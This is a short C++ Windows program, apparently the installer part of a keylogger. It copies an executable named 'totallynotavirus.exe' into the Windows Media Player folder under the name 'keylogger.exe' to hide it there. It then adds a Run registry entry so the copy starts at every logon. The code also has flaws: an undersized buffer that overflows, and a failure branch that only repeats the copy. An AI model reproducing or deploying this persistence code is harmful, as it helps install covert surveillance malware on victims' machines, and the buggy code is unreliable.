#include <iostream>
#include <Windows.h>
#include <typeinfo>
#include <string>
#include <tchar.h>

using namespace std;


int main() {
    HKEY hKey;
    LPCTSTR reg = TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");

    LPCTSTR name = TEXT("totallynotavirus.exe");

    LPCTSTR relative_path = TEXT("totallynotavirus.exe");

    TCHAR absolute_path[MAX_PATH]; //holds malware path
    TCHAR drive[_MAX_DRIVE];
    TCHAR dir[_MAX_DIR];

    DWORD pathLength = GetFullPathName(relative_path, MAX_PATH, absolute_path, nullptr);

    _tsplitpath(absolute_path, drive, dir, nullptr, nullptr);


    size_t rootLength = _tcslen(drive) + _tcslen(dir) + 1;
    TCHAR* root = new TCHAR[rootLength];

    _tcscpy(root, drive);
    _tcscat(root, _T("\\Program Files\\Windows Media Player\\keylogger.exe"));

    cout << root << std::endl;

    if (CopyFile(absolute_path, root, FALSE) != 0) {
        cout << "Success" << endl;
    }
    else if (CopyFile(absolute_path, root, FALSE) != 0) {
        cout << "Failed" << " " << GetLastError() << endl;
    }

    if (RegOpenKeyEx(HKEY_CURRENT_USER, reg, 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) {
        DWORD dataSize = static_cast<DWORD>(_tcslen(root) + 1) * sizeof(TCHAR); // Size in bytes, including the null terminator

        if (RegSetValueEx(hKey, name, 0, REG_SZ, reinterpret_cast<BYTE*>(root), dataSize) == ERROR_SUCCESS) {
            cout << "Success 2" << endl;
        }
        RegCloseKey(hKey);
    }

    delete[] root;

}
